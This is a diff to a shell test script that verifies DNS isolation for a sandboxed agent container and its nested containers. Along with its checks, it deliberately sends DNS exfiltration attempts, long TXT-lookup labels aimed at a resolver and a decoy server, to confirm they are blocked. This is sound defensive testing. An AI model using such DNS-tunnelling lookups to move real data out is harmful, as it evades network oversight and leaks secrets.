@@ -223,6 +223,61 @@ fi
 must   "public HTTPS works through the proxy"   curl -sf --max-time 20 -o /dev/null https://registry.npmjs.org/
 # The Claude API answers through the proxy (any HTTP status: no key is sent, 4xx is expected).
 must   "the Claude API answers through the proxy" sh -c 'c=$(curl -s --max-time 20 -o /dev/null -w "%{http_code}" https://api.anthropic.com/v1/messages); [ "${c:-000}" != 000 ]'
+# DNS (#98): the agent resolves no external name, whatever the resolver; the proxy does. lea-proxy
+# (a container on lea's network) still resolves: Docker's embedded resolver answers it, and
+# forwards nothing else (lea starts the container with --dns 192.0.2.1, which it has no route to).
+# dns_answers SERVER udp|tcp NAME QTYPE: any DNS answer from SERVER:53 within 4 s.
+# shellcheck disable=SC2317,SC2329 # run by must
+dns_answers() {
+  python3 -I -c 'import random, socket, struct, sys
+s, proto, name, qt = sys.argv[1:]
+q = struct.pack(">HHHHHH", random.randrange(65536), 0x0100, 1, 0, 0, 0)
+q += b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0" + struct.pack(">HH", int(qt), 1)
+try:
+    if proto == "udp":
+        c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); c.settimeout(4); c.sendto(q, (s, 53)); c.recvfrom(4096)
+    else:
+        c = socket.create_connection((s, 53), timeout=4); c.settimeout(4); c.sendall(struct.pack(">H", len(q)) + q)
+        if len(c.recv(2)) < 2: sys.exit(1)
+except OSError: sys.exit(1)' "$@"
+}
+if [ "${SECOND_KERNEL:-}" = 1 ]; then
+  # A sandboxed runtime's network stack may not carry Docker's embedded resolver: not containment.
+  if getent hosts lea-proxy >/dev/null 2>&1; then echo "info lea-proxy resolves"; else echo "info lea-proxy does not resolve"; fi
+else
+  must   "lea-proxy resolves (Docker's embedded resolver)" getent hosts lea-proxy
+fi
+mustnt "an external name does not resolve (example.com)" getent hosts example.com
+mustnt "an allowed name does not resolve (registry.npmjs.org)" getent hosts registry.npmjs.org
+for s in 8.8.8.8 1.1.1.1 ${DECOY_DNS_IP:-} ${GW_IP:-} ${HOST_IP:-}; do
+  for p in udp tcp; do
+    mustnt "no direct DNS to $s:53 over $p" dns_answers "$s" "$p" example.com 1
+  done
+done
+if [ -n "${DNS_MARK:-}" ]; then
+  # Exfiltration attempts, a long label of a TXT lookup: through the resolver of resolv.conf (UDP
+  # and TCP), glibc's, and straight to the decoy. isolation.sh asserts that none reached the decoy.
+  long=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+  ns=$(awk '$1 == "nameserver" { print $2; exit }' /etc/resolv.conf)
+  for p in udp tcp; do dns_answers "${ns:-127.0.0.11}" "$p" "$long.$p.$DNS_MARK" 16 || true; done
+  getent hosts "$long.glibc.$DNS_MARK" >/dev/null 2>&1 || true
+  [ -z "${DECOY_DNS_IP:-}" ] || dns_answers "$DECOY_DNS_IP" udp "$long.direct.$DNS_MARK" 16 || true
+  ok "DNS exfiltration attempts sent (isolation.sh checks the decoy's log)"
+fi
+# The same from a nested container (pasta forwards its DNS to lea's resolver).
+nested_dns() {
+  docker run --rm -e S="$1" -e L="${2:-}" busybox:1.37 sh -c "$3" >/dev/null 2>&1
+}
+mustnt "nested: an external name does not resolve (example.com)" nested_dns '' '' 'timeout 20 nslookup example.com'
+for s in 8.8.8.8 1.1.1.1 ${DECOY_DNS_IP:-}; do
+  mustnt "nested: no direct DNS to $s:53 over udp" nested_dns "$s" '' 'timeout 20 nslookup example.com "$S"'
+  mustnt "nested: no direct DNS to $s:53 over tcp" nested_dns "$s" '' 'timeout 20 nc -w 5 "$S" 53 </dev/null'
+done
+if [ -n "${DNS_MARK:-}" ]; then
+  nested_dns '' "$long.nested.$DNS_MARK" 'timeout 20 nslookup -type=txt "$L"' || true
+  [ -z "${DECOY_DNS_IP:-}" ] || nested_dns "$DECOY_DNS_IP" "$long.nested-direct.$DNS_MARK" 'timeout 20 nslookup -type=txt "$L" "$S"' || true
+  ok "nested: DNS exfiltration attempts sent (isolation.sh checks the decoy's log)"
+fi
 # Plain HTTP between nested containers stays direct (containers.conf: http_proxy = false): a
 # server, and a client in its network namespace fetching it at the namespace's own address (a
 # private one, not in NO_PROXY, which the proxy would refuse). Not over a network of their own:
